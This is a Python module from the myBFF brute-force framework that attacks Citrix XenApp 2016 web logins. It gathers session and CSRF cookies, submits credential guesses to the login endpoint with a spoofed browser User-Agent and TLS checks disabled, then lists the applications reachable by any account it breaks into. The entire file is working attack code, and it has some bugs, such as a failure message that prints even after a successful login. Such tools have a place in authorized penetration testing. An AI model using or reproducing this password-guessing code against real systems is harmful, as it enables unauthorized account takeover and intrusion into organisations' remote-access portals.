#! /usr/bin/python
# Created by Kirk Hayes (l0gan) @kirkphayes
# Part of myBFF
from core.webModule import webModule
from requests import session
import requests
import re
from argparse import ArgumentParser
import random


class citrix2016Brute(webModule):
    def __init__(self, config, display, lock):
        super(citrix2016Brute, self).__init__(config, display, lock)
        self.fingerprint="2016 Citrix"
        self.response="default.aspx"
        self.protocol="web"
    ignore = ['Settings','Log Off', 'Messages']
    def somethingCool(self, config, c, cookies2, cpost, proxy):
       resp3 = c.get(config["HOST"] + '/Citrix/XenApp/site/default.aspx?CTX_MessageType=INFORMATION&CTX_MessageKey=WorkspaceControlReconnectPartialTemp', cookies=cookies2, allow_redirects=False, verify=False, proxies=proxy)
       m = re.search('There are no resources currently available for this user.', resp3.text)
       if m:
           print("[-]      No resources available for user.")
       else:
           o = re.findall('<span>(.*?)</span>', resp3.text, re.DOTALL)
           print("[+]      The following apps/tabs are accessible to " + config["USERNAME"] + ":")
           for n in o:
               if n not in self.ignore:
                   print('[+]                 ' + n)
    def connectTest(self, config, payload, proxy, submitLoc, submitType):
        with session() as c:
            requests.packages.urllib3.disable_warnings()
            silentDetect1 = c.get(config["HOST"] + '/Citrix/XenApp/', allow_redirects=True, verify=False, proxies=proxy)
            host = config["HOST"].strip("https://")
            c.headers.update({'Host': host, 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Referer': config["HOST"] + '/Citrix/XenApp/', 'X-Citrix-IsUsingHTTPS': 'No', 'X-Requested-With': 'XMLHttpRequest', 'Accept-Language': 'en-US,en;q=0.5'})
            silentDetect = c.post(config["HOST"] + '/Citrix/XenApp/Home/Configuration', allow_redirects=True, verify=False, proxies=proxy)
            try:
                cookie2 = silentDetect.cookies['ASP.NET_SessionId']
                cookie3 = silentDetect.cookies['CsrfToken']
                cookies2 = dict()
                cookies2['ASP.NET_SessionId'] = cookie2
                cookies2['CsrfToken'] = cookie3
                cookies2['CtxsPluginAssistantState'] = 'Done'
                payload2 = {
                    'format': 'json',
                    'resourceDetails': 'Default'
                    }
                c.headers.update({'Host': host, 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Referer': config["HOST"] + '/Citrix/XenApp/', 'X-Citrix-IsUsingHTTPS': 'No', 'X-Requested-With': 'XMLHttpRequest', 'Csrf-Token': cookie3,'Accept-Language': 'en-US,en;q=0.5'})
                cpost = c.post(config["HOST"] + '/Citrix/XenApp/Resources/List', cookies=cookies2, data=payload2, allow_redirects=False, verify=False, proxies=proxy)
                cookie4 = cpost.cookies['CtxsDeviceId']
                cookies2['CtxsDeviceId'] = cookie4
                cpost = c.post(config["HOST"] + '/Citrix/XenApp/Authentication/GetAuthMethods', cookies=cookies2, allow_redirects=False, verify=False, proxies=proxy)
                c.headers.update({'Host': host, 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Referer': config["HOST"] + '/Citrix/XenApp/', 'X-Citrix-IsUsingHTTPS': 'No', 'X-Requested-With': 'XMLHttpRequest', 'X-Citrix-AM-CredentialTypes': 'none, username, domain, password, newpassword, passcode, savecredentials, textcredential', 'X-Citrix-AM-LabelTypes': 'none, plain, heading, information, warning, error, confirmation, image', 'Csrf-Token': cookie3,'Accept-Language': 'en-US,en;q=0.5'})
                cpost = c.post(config["HOST"] + '/Citrix/XenApp/ExplicitAuth/LoginAttempt', cookies=cookies2, data=payload, allow_redirects=False, verify=False, proxies=proxy)
                #print cpost.text
                m = re.search('default.aspx', cpost.text)
                if m:
                    print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
                    if not config["dry_run"]:
                        print("[!] Time to do something cool!")
                        self.somethingCool(config, c, cookies2, cpost, proxy)
            except:
                print "[-] An error occured"
            else:
                print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
